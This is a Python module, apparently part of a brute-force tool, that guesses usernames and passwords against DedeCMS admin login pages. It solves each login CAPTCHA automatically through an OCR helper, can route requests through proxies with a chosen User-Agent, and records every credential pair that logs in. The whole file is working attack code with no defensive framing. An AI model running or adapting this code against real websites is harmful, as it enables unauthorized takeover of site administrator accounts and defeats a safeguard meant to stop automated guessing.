import requests
import threading
import re
from lib.log import MyLogger
from lib.Identification_vercode import image_str

def save_img(bytes):
    with open("data/vdimgck.png", "wb") as f:
        f.write(bytes)

def login_check(content):
    # 这里返回的情况是动态写入的,因此不可以用lxml
    pattern = re.compile("document\.write\((.*?)\)")
    result = pattern.findall(content)[2]
    return result


threadingLock = threading.Lock()
def run(items):
    url,user_agent,proxy,username, password=items
    vdcode = ""
    url=url.strip("/")
    logurl=url+'/dede/login.php'
    header = {'User-Agent': user_agent}

    sesion = requests.session()
    for i in range(9):
        #获取验证码
        try:
            while len(vdcode) < 4:
                if proxy:
                    proxies = {
                        "http": "http://%(proxy)s/" % {'proxy': proxy},
                        "https": "http://%(proxy)s/" % {'proxy': proxy}
                    }
                    bytes_img = sesion.get(url+"/include/vdimgck.php", headers=header, proxies=proxies)
                else:
                    bytes_img = sesion.get(url+"/include/vdimgck.php", headers=header)
                bytes_img=bytes_img.content
                save_img(bytes_img)
                vdcode=image_str("data/vdimgck.png")
        except Exception as error:
            MyLogger.error(error)

        data = {
            "gotopage":url+'/dede/',
            "dopost":"login",
            "adminstyle":"newdedecms",
            "userid": username,
            "pwd": password,
            "validate": vdcode,
            "sm1":''
        }

        if proxy:
            proxies = {
                "http": "http://%(proxy)s/" % {'proxy': proxy},
                "https": "http://%(proxy)s/" % {'proxy': proxy}
            }
            response = sesion.post(logurl, headers=header, data=data, proxies=proxies)
        else:
            response = sesion.post(logurl, headers=header, data=data)

        loginResult = login_check(response.text)
        if response.status_code == 200 and "成功登录" == loginResult:
            break
    # print(loginResult)
    threadingLock.acquire()
    print(u'\r[#] 正在尝试凭据：'+username+"    "+password+' '*10,end='')
    # MyLogger.debug("正在尝试凭据："+username+" "+password)
    if response.status_code==200 and "成功登录"==loginResult:
        MyLogger.success("有效凭据："+username+" "+password)
        threadingLock.release()
        return {username:password}
    else:
        print(u'\r[#] 无效凭据：' + username + "    " + password+' '*10, end='')
        # MyLogger.debug("无效凭据："+username+" "+password)
        threadingLock.release()





